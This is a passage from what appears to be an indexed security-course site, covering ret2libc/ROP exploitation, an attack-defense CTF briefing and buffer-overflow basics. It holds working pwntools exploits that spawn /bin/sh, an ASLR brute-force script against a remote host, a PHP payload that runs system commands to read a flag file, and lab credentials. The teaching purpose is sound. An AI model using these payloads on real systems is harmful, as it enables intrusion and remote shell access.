<code>PUTS_GOT</code>. After that, <code>PUTS_PLT</code> will be called (with <code>PUTS_GOT</code> inside the RDI) so puts will read the content inside <code>PUTS_GOT</code> (the address of puts function in memory) and will print it out. Finally, main function is called again so we can exploit the overflow again.</p> <p>This way we have tricked puts function to print out the address in memory of the function puts (which is inside libc library). Now that we have that address we can search which libc version is being used.</p> <p></p> <p>As we are exploiting some local binary it is not needed to figure out which version of libc is being used (just find the library in <code>/lib/x86_64-linux-gnu/libc.so.6</code>). But, in a remote exploit case I will explain here how can you find it:</p>"},{"location":"CS315/2021/Week%2013/#31-searching-for-libc-version-1","title":"3.1- Searching for libc version (1)","text":"<p>You can search which library is being used in the web page: https://libc.blukat.me/ It will also allow you to download the discovered version of libc</p> <p></p>"},{"location":"CS315/2021/Week%2013/#32-searching-for-libc-version-2","title":"3.2- Searching for libc version (2)","text":"<p>You can also do:</p> <ul> <li><code>$ git clone https://github.com/niklasb/libc-database.git</code></li> <li><code>$ cd libc-database</code></li> <li><code>$ ./get</code></li> </ul> <p>This will take some time, be patient. For this to work we need:</p> <ul> <li>Libc symbol name: <code>puts</code></li> <li>Leaked libc adddress: <code>0x7ff629878690</code></li> </ul> <p>We can figure out which libc that is most likely used.</p> <pre><code>./find puts 0x7ff629878690\nubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)\narchive-glibc (id libc6_2.23-0ubuntu11_amd64)\n</code></pre> <p>We get 2 matches (you should try the second one if the first one is not working). Download the first one:</p> <pre><code>./download libc6_2.23-0ubuntu10_amd64\nGetting libc6_2.23-0ubuntu10_amd64\n  -&gt; Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb\n  -&gt; Downloading package\n  -&gt; Extracting package\n  -&gt; Package saved to libs/libc6_2.23-0ubuntu10_amd64\n</code></pre> <p>Copy the libc from <code>libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so</code> to our working directory.</p>"},{"location":"CS315/2021/Week%2013/#33-other-functions-to-leak","title":"3.3- Other functions to leak","text":"<pre><code>puts\nprintf\n__libc_start_main\nread\ngets\n</code></pre>"},{"location":"CS315/2021/Week%2013/#4-finding-based-libc-address-exploiting","title":"4- Finding based libc address &amp; exploiting","text":"<p>At this point we should know the libc library used. As we are exploiting a local binary I will use just:<code>/lib/x86_64-linux-gnu/libc.so.6</code></p> <p>So, at the begging of <code>template.py</code> change the libc variable to: <code>libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") #Set library path when know it</code></p> <p>Giving the path to the libc library the rest of the exploit is going to be automatically calculated.</p> <p>Inside the <code>get_addr</code>function the base address of libc is going to be calculated:</p> <pre><code>if libc != \"\":\n    libc.address = leak - libc.symbols[func_name] #Save libc base\n    log.info(\"libc base @ %s\" % hex(libc.address))\n</code></pre> <p>Then, the address to the function <code>system</code> and the address to the string \"/bin/sh\" are going to be calculated from the base address of libc and given the libc library.</p> <pre><code>BINSH = next(libc.search(\"/bin/sh\")) - 64 #Verify with find /bin/sh\nSYSTEM = libc.sym[\"system\"]\nEXIT = libc.sym[\"exit\"]\n\nlog.info(\"bin/sh %s \" % hex(BINSH))\nlog.info(\"system %s \" % hex(SYSTEM))\n</code></pre> <p>Finally, the /bin/sh execution exploit is going to be prepared sent:</p> <pre><code>rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)\n\np.clean()\np.sendline(rop2)\n\n##### Interact with the shell #####\np.interactive() #Interact with the conenction\n</code></pre> <p>Let's explain this final ROP. The last ROP (<code>rop1</code>) ended calling again the main function, then we can exploit again the overflow (that's why the <code>OFFSET</code> is here again). Then, we want to call <code>POP_RDI</code> pointing to the addres of \"/bin/sh\" (<code>BINSH</code>) and call system function (<code>SYSTEM</code>) because the address of \"/bin/sh\" will be passed as a parameter. Finally, the address of exit function is called so the process exists nicely and any alert is generated.</p> <p>This way the exploit will execute a /bin/sh shell.</p> <p></p>"},{"location":"CS315/2021/Week%2013/#42-using-one_gadget","title":"4(2)- Using ONE_GADGET","text":"<p>You could also use ONE_GADGET to obtain a shell instead of using system and \"/bin/sh\". ONE_GADGET will find inside the libc library some way to obtain a shell using just one ROP. However, normally there are some constrains, the most common ones and easy to avoid are like <code>[rsp+0x30] == NULL</code> As you control the values inside the RSP you just have to send some more NULL values so the constrain is avoided.</p> <pre><code>ONE_GADGET = libc.address + 0x4526a\nrop2 = base + p64(ONE_GADGET) + \"\\x00\"*100\n</code></pre>"},{"location":"CS315/2021/Week%2013/#exploit-file","title":"EXPLOIT FILE","text":"<p>You can find a template to exploit this vulnerability here:</p> <p>ROP-PWN template</p>"},{"location":"CS315/2021/Week%2013/#common-problems","title":"Common problems","text":""},{"location":"CS315/2021/Week%2013/#main_plt-elfsymbolsmain-not-found","title":"MAIN_PLT = elf.symbols['main'] not found","text":"<p>If the \"main\" symbol does not exist. Then you can just where is the main code:</p> <pre><code>objdump -d vuln_binary | grep \"\\.text\"\nDisassembly of section .text:\n0000000000401080 &lt;.text&gt;:\n</code></pre> <p>and set the address manually:</p> <pre><code>MAIN_PLT = 0x401080\n</code></pre>"},{"location":"CS315/2021/Week%2013/#puts-not-found","title":"Puts not found","text":"<p>If the binary is not using Puts you should check if it is using</p>"},{"location":"CS315/2021/Week%2013/#sh-1-ssssssss-not-found","title":"<code>sh: 1: %s%s%s%s%s%s%s%s: not found</code>","text":"<p>If you find this error after creating all the exploit: <code>sh: 1: %s%s%s%s%s%s%s%s: not found</code></p> <p>Try to subtract 64 bytes to the address of \"/bin/sh\":</p> <pre><code>BINSH = next(libc.search(\"/bin/sh\")) - 64\n</code></pre>"},{"location":"CS315/2021/Week%2013/#ret2lib","title":"Ret2Lib","text":"<p>If you have found a vulnerable binary and you think that you can exploit it using Ret2Lib here you can find some basic steps that you can follow.</p>"},{"location":"CS315/2021/Week%2013/#if-you-are-inside-the-host","title":"If you are inside the host","text":""},{"location":"CS315/2021/Week%2013/#you-can-find-the-address-of-libc","title":"You can find the address of libc","text":"<pre><code>ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)\n</code></pre> <p>If you want to check if the ASLR is changing the address of libc you can do:</p> <pre><code>for i in `seq 0 20`; do ldd &lt;Ejecutable&gt; | grep libc; done\n</code></pre>"},{"location":"CS315/2021/Week%2013/#get-offset-of-system-function","title":"Get offset of system function","text":"<pre><code>readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system\n</code></pre>"},{"location":"CS315/2021/Week%2013/#get-offset-of-binsh","title":"Get offset of \"/bin/sh\"","text":"<pre><code>strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh\n</code></pre>"},{"location":"CS315/2021/Week%2013/#procmaps","title":"/proc/\\/maps <p>If the process is creating children every time you talk with it (network server) try to read that file (probably you will need to be root).</p> <p>Here you can find exactly where is the libc loaded inside the process and where is going to be loaded for every children of the process.</p> <p></p> <p>In this case it is loaded in 0xb75dc000 (This will be the base address of libc)</p>","text":""},{"location":"CS315/2021/Week%2013/#using-gdb-peda","title":"Using gdb-peda <p>Get address of system function, of exit function and of the string \"/bin/sh\" using gdb-peda:</p> <pre><code>p system\np exit\nfind \"/bin/sh\"\n</code></pre>","text":""},{"location":"CS315/2021/Week%2013/#bypassing-aslr","title":"Bypassing ASLR","text":"<p>You can try to bruteforce the abse address of libc.</p> <pre><code>for off in range(0xb7000000, 0xb8000000, 0x1000):\n</code></pre>"},{"location":"CS315/2021/Week%2013/#code_1","title":"Code","text":"<pre><code>from pwn import *\n\nc = remote('192.168.85.181',20002)\nc.recvline()    #Banner\n\nfor off in range(0xb7000000, 0xb8000000, 0x1000):\n    p = \"\"\n    p += p32(off + 0x0003cb20) #system\n    p += \"CCCC\" #GARBAGE\n    p += p32(off + 0x001388da) #/bin/sh\n    payload = 'A'*0x20010 + p\n    c.send(payload)\n    c.interactive() #?\n</code></pre>"},{"location":"CS315/2021/Week%2013/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%2013/#5-pt-ret2win","title":"(5 pt) ret2win","text":"<p>Challenge is from https://ropemporium.com/challenge/ret2win.html</p> <p>If you are interested in the ROP exploit, please take a look at ROP Emporium.</p> <p>Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.</p> <p><code>nc 103.102.44.218 10001</code></p> <p>Download binary x86_64 ELF: https://ropemporium.com/binary/ret2win.zip</p> <p>Hint: check the LET'S DO THIS part of original challenge.</p>"},{"location":"CS315/2021/Week%2013/#5-pt-awd-prepare","title":"(5 pt) AWD prepare","text":"<p>We know that we are going to have a AWD CTF next week. Make sure you have access to the test AWD environment. Check the demo challenge and try to hack it to get a flag.</p> <p>Browser the page <code>http://103.102.44.218:23333/</code> in your browser, login with some test account below:</p> <pre><code>Account\uff1aTEST1 Password\uff1aYpkyiQDwGHLjoOk3\nAccount\uff1aTEST2 Password\uff1apQXBpiFPlNBB6TUt\nAccount\uff1aTEST3 Password\uff1acUMvgNGCb64E4uLv\nAccount\uff1aTEST4 Password\uff1aRQGqtTfK6601c7qY\nAccount\uff1aTEST5 Password\uff1aSVtm4Pd3vtAaeQvZ\nAccount\uff1aTEST6 Password\uff1alNTrEnx586taV8Ow\nAccount\uff1aTEST7 Password\uff1awXxFkOsGcpb1XsIo\nAccount\uff1aTEST8 Password\uff1aAhcNEZpaBWAm3Jst\nAccount\uff1aTEST9 Password\uff1alxqzbu9tjkshQ0oB\nAccount\uff1aTEST10 Password\uff1abRewQknqeY3yrZCc\n</code></pre> <p>The flag file is located in <code>/var/flag/flag.txt</code>. The application files are under <code>/app</code>. You have the permission to read and modify the application files.</p> <p>During the AWD CTF, you can only access <code>ctf</code> user. Here's the account information:</p> <pre><code>IP address: 103.102.44.218\nService port: 20000-20009\nSSH port: 30000-30009\nUsername: ctf\nPassword: 123456\n</code></pre> <p>Further, only for testing, you have the root password:</p> <pre><code>Username: root\nPassword: rootpassword\n</code></pre> <p>Please DO NOT change the password of the users during testing.</p> <p>In this challenge, you should post those screenshots in your writeup:</p> <ol> <li>The screenshot of the port 2000x: make sure the PHP code is shown.</li> </ol> <p>\u200b    In the browser: <code>http://103.102.44.218:2000x/</code></p> <ol> <li>The screenshot of the successful login to port 3000x: make sure you can access the server from user <code>ctf</code>.</li> </ol> <p>\u200b    In the terminal: <code>ssh ctf@103.102.44.218 -p 3000x</code></p> <ol> <li>The screenshot of the flag.txt content.</li> </ol> <p>\u200b    In the ssh session: <code>cat /var/flag/flag.txt</code></p> <p>Hope you enjoy the AWD.</p> <pre><code>Q&amp;As:\n\nQ: How to modify the file on the server?\nA: Use scp command to transfer files through network. Download the file to you local machine and modify, after that then push the file to the server.\nFor example:\nscp -P 30000 ctf@103.102.44.218:/app/index.php ./\n&lt;modify&gt;\nscp -P 30000 ./index.php ctf@103.102.44.218:/app/index.php\n\nQ: Can I install software on the server (vim for example)?\nA: You can't install software through apt. But if you have other methods, they're allowed.\n\nQ: Can I delete flag.txt after I read it?\nA: You can't. Only root can modify flag.txt.\n</code></pre>"},{"location":"CS315/2021/Week%2014/","title":"Week14 CTF: Attack-Defense CTF","text":"<p>An Attack/Defense Capture the Flag is a type of cybersecurity competition where competing teams attempt to find security vulnerabilities in services run by the opposing teams. Each team works finding vulnerabilities in other team\u2019s services while protecting their own, hence \u201cattack/defense\u201d.</p> <p></p> <p>(image from CTF.zone)</p> <p>All teams are given an image to host on servers, usually a Linux distribution with code for several services that the game creators made. For example, in this year\u2019s saarCTF, there were some simple websites for food reviews and calendar events hosted on a linux server. All teams get the same images, so if you find a vulnerability in your server, you can use it to attack other teams\u2019.</p> <p>When the competition starts, you gain access to the servers and can start reading the code and looking for vulnerabilities. The game admins will use your service (programmatically) as normal users and place \u201cflags\u201d for other teams to steal if they find vulnerabilities. For example, they might create private events in the calendar app mentioned earlier, and the flags would be in the details of the event.</p> <p>Vulnerabilities are generally intentionally placed, though sometimes game creators make mistakes and there are extra unintentional attack paths. Competitions tend to have a range of easy to more complicated exploits.</p> <p>A simple exploit might be finding that the <code>view_calendar_event</code> function takes in a uid from the request, and doesn\u2019t validate that this is the same user as the logged in user. A more complicated exploit could involve a buffer overflow leading to a remote code execution. There\u2019s also been exploits using less traditional methods, like adversarial machine learning: fausecteam/faustctf-2018-jodlgang.</p> <p>After finding a vulnerability, the next step is to build a script to exploit it on other teams\u2019 servers and patch the issue on your own server. Points are determined based on how many opposing teams you\u2019re able to steal flags from and how many flags you successfully prevent other teams from stealing.</p>"},{"location":"CS315/2021/Week%2014/#rules","title":"Rules","text":"<p>Competition start time: 2021-12-13 21:00</p> <p>Competition end time: 2021-12-16 21:00</p> <p>Time per round: 5 minutes (864 rounds in total)</p> <p>Score per round: 50</p> <p>Challenges:</p> <ul> <li>Sanity_check (web)</li> <li>Calculator (web)</li> <li>Binary (pwn)</li> <li>Image manipulator (web)</li> <li>Blog (web)</li> </ul> <p>Base score per challenge: 1000</p> <p>Total teams: 50</p> <p>Flag location: <code>/var/flag.txt</code></p> <p>SSH user: <code>ctf</code></p> <p>SSH default password: <code>123456</code></p>"},{"location":"CS315/2021/Week%2014/#challenges","title":"Challenges","text":"<p>The AWD CTF has 5 challenges in total. Involving 4 web and 1 pwn.</p>"},{"location":"CS315/2021/Week%2014/#sanity_check","title":"Sanity_check","text":"<p>This challenge is simple PHP script:</p> <p></p> <p>The script requires one parameter called <code>str</code>, and gives out the length of the string.</p> <p>For example, a valid request might be:</p> <pre><code>http://ip:port/?str=some_example_string\n</code></pre> <p>The page would response the following text:</p> <pre><code>some_example_string length is 19\n</code></pre>"},{"location":"CS315/2021/Week%2014/#calculator","title":"Calculator","text":"<p>The website is written in PHP.</p> <p>The calculator has only 1 function: to calculate the input equation of user.</p> <p></p> <p>An example input of <code>2*3</code> would result in <code>6</code>.</p>"},{"location":"CS315/2021/Week%2014/#binary","title":"Binary","text":"<p>This challenge doesn't offer any source code.</p> <p>However, you can modify the binary ELF file with any hex editor or de-compiler.</p> <p>First of all, we are given 5 choices:</p> <pre><code>1.register\n2.login\n3.reset passwd\n4.play game\n5.logout\nYour choice:\n</code></pre> <p>We need to register and then login. After that, we can play this game.</p> <p>By choosing 4, the game begins:</p> <pre><code>1.name your city\n2.rename your city\n3.manage your shop\n4.manage your army\n5.show your city\n6.battle\n7.back\nYour choice:\n</code></pre> <p>We can name cities, manage shops, and manage army. After everything is done, we would like to battle.</p> <p>However, the game is too difficult. Most of the time, we only have the bad ending.</p>"},{"location":"CS315/2021/Week%2014/#image-manipulator","title":"Image manipulator","text":"<p>This web app allows us to manipulate the images.</p> <p></p> <p>We can upload a file and modify those information:</p> <pre><code>1. width and height\n2. crop the image\n3. rotate the image\n4. flip\n5. mirror\n6. grayscale\n7. sepia\n</code></pre> <p>Let's take a look at the source code.</p> <p>In the <code>/usr/bin/gs</code> file is the <code>ghostscript</code>. Ghostscript is an interpreter for PostScript Portable Document Format (PDF) files.</p> <pre><code>app\n\u251c\u2500\u2500 App.php\n\u251c\u2500\u2500 Driver\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Base.php\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Convert.php\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Image.php\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 index.html\n\u251c\u2500\u2500 Template\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 index.html\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main.html\n\u251c\u2500\u2500 assets\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 index.html\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main.css\n\u251c\u2500\u2500 inc.php\n\u2514\u2500\u2500 index.php\n</code></pre> <p>Under the <code>app</code> folder is the main structure of the website. The website is written by PHP. An <code>index.php</code> hooks all the files to work together.</p> <p><code>inc.php</code>: defines some folder location.</p> <p><code>App.php</code>: main logic of the website. Sends all requests to target file.</p> <p><code>assets</code>: static pages.</p> <p><code>Template</code>: static web html style.</p> <p><code>Driver</code>: you should look at files under this folder and find out the vulnerabilities.</p>"},{"location":"CS315/2021/Week%2014/#blog","title":"Blog","text":"<p>Blog is a fully functional blog website with all pages you need.</p> <p>The website contains a database of MySQL on 3306. And based on the zblog template.</p> <p>Blog has a CMS and you should check out the installation first.</p> <p></p> <p>Let's look at the source code.</p> <pre><code>src\n\u251c\u2500\u2500 feed.php\n\u251c\u2500\u2500 index.php\n\u251c\u2500\u2500 search.php\n\u251c\u2500\u2500 zb_install\n\u251c\u2500\u2500 zb_system\n\u2514\u2500\u2500 zb_users\n</code></pre> <p>There are 3 major folders under the source code.</p> <p>Firstly, <code>zb_install</code> takes all the installation options and instructions to setup a website.</p> <p><code>ab_system</code> is the main function of the website admin panel.</p> <p><code>zb_users</code> takes all user functions.</p>"},{"location":"CS315/2021/Week%2014/#notification","title":"Notification","text":"<ol> <li>The AWD platform is using <code>HTTP</code>, which means it's possible to analyze network traffic of others.</li> <li>No root privilege.</li> <li>Using of 0day is valid.</li> <li>DDoS or other brute DoS are NOT valid.</li> <li>Never share flag with others.</li> </ol>"},{"location":"CS315/2021/Week%2014/#prepare","title":"Prepare","text":"<p>Before the AWD CTF, you should check the following list:</p> <ul> <li>Change the default password for each game box.</li> <li>Check all the services are running well.</li> <li>Scan the ports of other players.</li> <li>Read the source code and patch the vulnerabilities.</li> <li>Adjust your script to submit flag.</li> </ul>"},{"location":"CS315/2021/Week%2014/#flag-submitter","title":"Flag Submitter","text":"<pre><code>curl -X POST http://www.compass.college/api/flag -H \"Authorization: &lt;token&gt;\" -d \"{ \\\"flag\\\": \\\"your_flag_here\\\" }\"\n</code></pre> <p>GitHub repo of an example flag submitter:</p> <p>https://github.com/0xaww/awd-submit-flag</p> <p></p>"},{"location":"CS315/2021/Week%2014/#exploit-script","title":"Exploit Script","text":"<p>Using manual exploit is not efficient. By using automate script to exploit and submit the flag.</p> <p>An example exploit script of a SSTI vulnerability looks like:</p> <pre><code>import requests\nurl = \"\"\ndata = {\n    \"method\": \"__construct\",\n    \"filter[]\": \"assert\",\n    \"method\": \"get\",\n    \"get[]\": \"die((new ReflectionFunction('syste'.'m'))-&gt;invoke('cat /var/flag.txt'))\",\n}\nprint(requests.post(url, data=data).text)\n</code></pre> <p>The script can be configured to run every 5 minutes or using flag submitter to hook the exploit script.</p>"},{"location":"CS315/2021/Week%202/","title":"Week 2 PWN: Basic Buffer Overflow","text":"<p>According to the @CTF101: https://ctf101.org/</p>"},{"location":"CS315/2021/Week%202/#binary-exploitation","title":"Binary Exploitation","text":"<p>Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions.</p> <p>Common topics addressed by Binary Exploitation or 'pwn' challenges include:</p> <ul> <li>Registers</li> <li>The Stack</li> <li>Calling Conventions</li> <li>Global Offset Table (GOT)</li> <li>Buffers</li> <li>Buffer Overflow</li> <li>Return Oriented Programming (ROP)</li> <li>Binary Security</li> <li>No eXecute (NX)</li> <li>Address Space Layout Randomization (ASLR)</li> <li>Stack Canaries</li> <li>Relocation Read-Only (RELRO)</li> <li>The Heap</li> <li>Heap Exploitation</li> <li>Format String Vulnerability</li> </ul>"},{"location":"CS315/2021/Week%202/#buffers","title":"Buffers","text":"<p>A buffer is any allocated space in memory where data (often user input) can be stored. For example, in the following C program <code>name</code> would be considered a stack buffer:</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char name[64] = {0};\n    read(0, name, 63);\n    printf(\"Hello %s\", name);\n    return 0;\n}\n</code></pre> <p>Buffers could also be global variables:</p> <pre><code>#include &lt;stdio.h&gt;\n\nchar name[64] = {0};\n\nint main() {\n    read(0, name, 63);\n    printf(\"Hello %s\", name);\n    return 0;\n}\n</code></pre> <p>Or dynamically allocated on the heap:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    char *name = malloc(64);\n    memset(name, 0, 64);\n    read(0, name, 63);\n    printf(\"Hello %s\", name);\n    return 0;\n}\n</code></pre>"},{"location":"CS315/2021/Week%202/#exploits","title":"Exploits","text":"<p>Given that buffers commonly hold user input, mistakes when writing to them could result in attacker controlled data being written outside of the buffer's space.</p>"},{"location":"CS315/2021/Week%202/#introduction-to-stack","title":"Introduction to Stack","text":"<p>A stack is an abstract data type frequently used in computer science. It has a property that the Last item placed will be the first to be removed from it ( LIFO ) . Several options are defined on the stack , the most important ones are <code>push</code> and <code>pop</code> . <code>push</code> add an element to the top of the stack , and <code>pop</code> removes elements from the top .</p> <pre><code>    /* The address of memory which is pointed by the Stack Pointer ( sp ) is the top of the stack */\n\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 &lt;\u2500 sp\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    : push 0x10                               /* sp is incremented and the value is stored at that address */\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \n    \u2502     0x10     \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 &lt;\u2500 sp\n\n    : push 0x20\n\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502    0x10      \u2502\n    \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n    \u2502    0x20      \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 &lt;\u2500 sp\n\n    : pop var                                 /* The value pointed by the sp is removed from the stack and sp is decremented */\n\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \n    \u2502     0x10     \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 &lt;\u2500 sp\n</code></pre> <p>Modern computers are designed with the need of high-level languages in mind. The most important technique for structuring programs introduced by high-level languages is the function. From one point of view, a function call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack.</p> <p>The stack is also used to allocate local variables , to pass parameters to the functions, and to store the information needed to return to caller function after the execution of the function gets over.</p> <p>The stack pointer is a special register which will always point to the top of the stack , in x86-32 bit this register is called <code>esp</code> .The area allocated on the stack for a function is called it's stack frame . and the registers <code>ebp</code> and <code>esp</code> (in x86-32 bit system )are used to specify the boundaries of the stack frame . The <code>ebp</code> will point to the staring of the stack frame of the current function and the <code>esp</code> register will point to the bottom.</p>"},{"location":"CS315/2021/Week%202/#buffer-overflow","title":"Buffer Overflow","text":"<p>A Buffer Overflow is a vulnerability in which data can be written which exceeds the allocated space, allowing an attacker to overwrite other data.</p>"},{"location":"CS315/2021/Week%202/#stack-buffer-overflow","title":"Stack buffer overflow","text":"<p>The simplest and most common buffer overflow is one where the buffer is on the stack. Let's look at an example.</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int secret = 0xdeadbeef;\n    char name[100] = {0};\n    read(0, name, 0x100);\n    if (secret == 0x1337) {\n        puts(\"Wow! Here's a secret.\");\n    } else {\n        puts(\"I guess you're not cool enough to see my secret\");\n    }\n}\n</code></pre> <p>There's a tiny mistake in this program which will allow us to see the secret. <code>name</code> is decimal 100 bytes, however we're reading in hex 100 bytes (=256 decimal bytes)! Let's see how we can use this to our advantage.</p> <p>If the compiler chose to layout the stack like this:</p> <pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP\n        0xffff0068: 0xffff0100  // Saved EBP\n        0xffff0064: 0xdeadbeef  // secret\n...\n        0xffff0004: 0x0\nESP -&gt;  0xffff0000: 0x0         // name\n</code></pre> <p>let's look at what happens when we read in 0x100 bytes of 'A's.</p> <p>The first decimal 100 bytes are saved properly:</p> <pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP\n        0xffff0068: 0xffff0100  // Saved EBP\n        0xffff0064: 0xdeadbeef  // secret\n...\n        0xffff0004: 0x41414141\nESP -&gt;  0xffff0000: 0x41414141  // name\n</code></pre> <p>However when the 101st byte is read in, we see an issue:</p> <pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP\n        0xffff0068: 0xffff0100  // Saved EBP\n        0xffff0064: 0xdeadbe41  // secret\n...\n        0xffff0004: 0x41414141\nESP -&gt;  0xffff0000: 0x41414141  // name\n</code></pre> <p>The least significant byte of <code>secret</code> has been overwritten! If we follow the next 3 bytes to be read in, we'll see the entirety of <code>secret</code> is \"clobbered\" with our 'A's</p> <pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP\n        0xffff0068: 0xffff0100  // Saved EBP\n        0xffff0064: 0x41414141  // secret\n...\n        0xffff0004: 0x41414141\nESP -&gt;  0xffff0000: 0x41414141  // name\n</code></pre> <p>The remaining 152 bytes would continue clobbering values up the stack.</p>"},{"location":"CS315/2021/Week%202/#passing-an-impossible-check","title":"Passing an impossible check","text":"<p>How can we use this to pass the seemingly impossible check in the original program? Well, if we carefully line up our input so that the bytes that overwrite <code>secret</code> happen to be the bytes that represent 0x1337 in little-endian, we'll see the secret message.</p> <p>A small Python one-liner will work nicely: <code>python -c \"print 'A'*100 + '\\x31\\x13\\x00\\x00'\"</code></p> <p>This will fill the <code>name</code> buffer with 100 'A's, then overwrite <code>secret</code> with the 32-bit little-endian encoding of 0x1337.</p>"},{"location":"CS315/2021/Week%202/#going-one-step-further","title":"Going one step further","text":"<p>As discussed on the stack page, the instruction that the current function should jump to when it is done is also saved on the stack (denoted as \"Saved EIP\" in the above stack diagrams). If we can overwrite this, we can control where the program jumps after <code>main</code> finishes running, giving us the ability to control what the program does entirely.</p> <p>Usually, the end objective in binary exploitation is to get a shell (often called \"popping a shell\") on the remote computer. The shell provides us with an easy way to run anything we want on the target computer.</p> <p>Say there happens to be a nice function that does this defined somewhere else in the program that we normally can't get to:</p> <pre><code>void give_shell() {\n    system(\"/bin/sh\");\n}\n</code></pre> <p>Well with our buffer overflow knowledge, now we can! All we have to do is overwrite the saved EIP on the stack to the address where <code>give_shell</code> is. Then, when main returns, it will pop that address off of the stack and jump to it, running <code>give_shell</code>, and giving us our shell.</p> <p>Assuming <code>give_shell</code> is at 0x08048fd0, we could use something like this: <code>python -c \"print 'A'*108 + '\\xd0\\x8f\\x04\\x08'\"</code></p> <p>We send 108 'A's to overwrite the 100 bytes that is allocated for <code>name</code>, the 4 bytes for <code>secret</code>, and the 4 bytes for the saved EBP. Then we simply send the little-endian form of <code>give_shell</code>'s address, and we would get a shell!</p> <p>This idea is extended on in Return Oriented Programming.</p>"},{"location":"CS315/2021/Week%202/#overwrite-values-on-stack","title":"Overwrite values on stack","text":"<p>For example, we are given the following code in C language:</p> <pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char **argv)\n{\n volatile int modified;\n char buffer[64];\n\n if(argc == 1) {\n  errx(1, \"please specify an argument\\n\");\n }\n\n modified = 0;\n strcpy(buffer, argv[1]);\n\n if(modified == 0x61626364) {\n  printf(\"you have correctly got the variable to the right value\\n\");\n } else {\n  printf(\"Try again, you got 0x%08x\\n\", modified);\n }\n}\n</code></pre>"},{"location":"CS315/2021/Week%202/#breakdown","title":"Breakdown","text":"<p>So this code :</p> <p>creates a variable called \u201cmodified\u201d and assigns a buffer of 64 chars to it.</p> <pre><code>volatile int modified; \nchar buffer[64];\n</code></pre> <p>Checks if we supplied an argument or not.</p> <pre><code>if(argc == 1) {\n errx(1, \"please specify an argument\\n\");\n}\n</code></pre> <p>Sets the value of the \u201cmodified\u201d variable into 0 , then it copies whatever we give it <code>argv[1]</code> into the buffer of \u201cmodified\u201d.</p> <pre><code>modified = 0;\nstrcpy(buffer, argv[1]);\n</code></pre> <p>Then it checks if the variable\u2019s value is <code>0x61626364</code> or not</p> <pre><code>if(modified == 0x61626364) {\n  printf(\"you have correctly got the variable to the right value\\n\");\n } else {\n  printf(\"Try again, you got 0x%08x\\n\", modified);\n }\n</code></pre>"},{"location":"CS315/2021/Week%202/#solution","title":"Solution","text":"<p>So it\u2019s similar to Stack0 except we need to set the value of the variable into a specific value which is <code>0x61626364</code> in this case. This is the hexadecimal value of \u201cdcba\u201d now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let\u2019s try it.</p> <p>Let\u2019s execute stack1</p> <p></p> <p>We get please specify an argument so let\u2019s enter anything.</p> <p></p> <p></p> <p>We get try again you got 0x00000000 , Let\u2019s try to change that by exceeding the buffer and entering any char for example \u201cb\u201d</p> <pre><code>./stack1 `python -c \"print ('A' * 64 + 'b')\"`\n</code></pre> <p></p> <p>And we see that the value changed to 0x00000062 which is the hex value of \u201cb\u201d so our exploit is working, Let\u2019s apply that.</p> <pre><code>./stack1 `python -c \"print ('A' * 64 + 'dcba')\"`\n</code></pre> <p></p> <p>And we did it !</p> <p>But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them.</p> <pre><code>./stack1 `python -c \"print('A' * 64 + '\\x64\\x63\\x62\\x61')\"`\n</code></pre> <p></p>"},{"location":"CS315/2021/Week%202/#shellcode","title":"Shellcode","text":"<p>In real exploits, it's not particularly likely that you will have a 